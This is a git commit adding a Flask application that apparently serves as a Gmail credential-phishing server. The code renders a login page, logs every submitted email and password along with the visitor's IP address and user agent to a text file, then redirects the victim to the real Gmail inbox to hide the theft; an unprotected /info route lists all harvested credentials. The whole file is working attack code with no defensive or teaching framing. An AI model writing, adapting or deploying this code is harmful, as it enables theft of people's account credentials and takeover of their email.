5db7164e2bacaf9af03378ec2a4188b4ad05e171
maralyusuf <yusufefsaneyusuf@gmail.com>
2020-08-29 23:00:58 -0400

    first commit

---
+++ main.py
@@ -0,0 +1,50 @@
+from flask import Flask,request,render_template,redirect
+import sqlite3
+
+# database
+
+
+app = Flask(__name__)
+
+@app.route('/',methods= ['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        email = request.form.get('email')
+        password = request.form.get('password')
+        host = request.remote_addr
+        user = request.remote_user
+        user_agent = request.user_agent
+        file = open("info.txt",'a')
+        file.write(f"email : {email}  password : {password} host : {host} user : {user}  user_agent : {user_agent}\n")
+        file.flush()
+        return redirect('https://mail.google.com/mail/u/0/#inbox')
+
+    return render_template('login.html')
+
+@app.route('/<r>',methods= ['GET', 'POST'])
+def indexd(r):
+    if request.method == 'POST':
+        email = request.form.get('email')
+        password = request.form.get('password')
+        host = request.remote_addr
+        user = request.remote_user
+        user_agent = request.user_agent
+        file = open("info.txt",'a')
+        file.write(f"email : {email}  password : {password} host : {host} user : {user}  user_agent : {user_agent}\n")
+        file.flush()
+        return redirect('https://mail.google.com/mail/u/0/#inbox')
+
+    return render_template('login.html')
+
+@app.route("/info")
+def execute():
+    file = open("info.txt")
+    info = file.readlines()
+
+    return render_template('execute.html',info=info)
+
+
+if __name__ == '__main__':
+    app.debug = True
+    app.run()
+
